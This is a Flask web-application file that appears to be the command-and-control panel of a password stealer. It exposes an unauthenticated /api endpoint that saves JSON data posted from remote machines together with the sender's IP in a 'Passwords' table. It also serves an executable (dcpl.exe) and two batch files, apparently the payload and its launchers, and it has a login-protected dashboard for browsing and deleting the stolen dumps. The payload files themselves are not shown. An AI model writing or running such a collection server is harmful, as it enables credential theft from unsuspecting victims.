from flask import Blueprint, render_template, Response, request, jsonify, redirect, send_file
from flask_login import login_required, login_user, logout_user, current_user
from ..models import Users, Passwords
from ..extentions import db
import requests
import json
import time
import os
from hashlib import sha256

web = Blueprint("web", __name__, template_folder="templates", static_folder="static")

@web.route("/")
@login_required
def index():
    data = Passwords.query.all()
    return render_template("index.html", data=data)

@web.route("/data/<int:id>")
@login_required
def see_data(id):
    path = Passwords.query.get(id).data_paths
    with open(path, "r")as f:
        data = json.load(f)
    return render_template("data.html", data=data)

@web.route("/data/<int:id>/delete")
@login_required
def delete_data(id):
    path = Passwords.query.get(id).data_paths
    try: os.remove(path=path)
    except: path = ""
    db.session.delete(Passwords.query.get(id))
    db.session.commit()
    return redirect("/")

@web.route("/api", methods=["POST"])
def get_pswd():
    data = request.get_json()
    name = data["name"]
    fname = f"{name}_{time.time()}"
    with open(f"data/{fname}.json", "w") as f:
        json.dump(data, f)
        db.session.add(Passwords(ip=request.remote_addr, name=name, data_paths=f"data/{fname}.json"))
        db.session.commit()
    return "Success"

@web.route("/getexe")
def download_exe():
    return send_file("stash/dcpl.exe")

@web.route("/getconf")
def download_conf():
    return send_file("stash/execonf.bat")

@web.route("/getstart")
def download_start():
    return send_file("stash/start.bat")

@web.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["user"]
        password = request.form["password"]
        user = Users.query.filter_by(username=username).first()
        if user and user.password == sha256(password.encode("utf-8")).hexdigest():
            login_user(user)
            return redirect("/")
        else: return "Wrong password"
    return render_template("login.html")

@web.route("/logout")
def logout():
    logout_user()
    return f"Logged out"
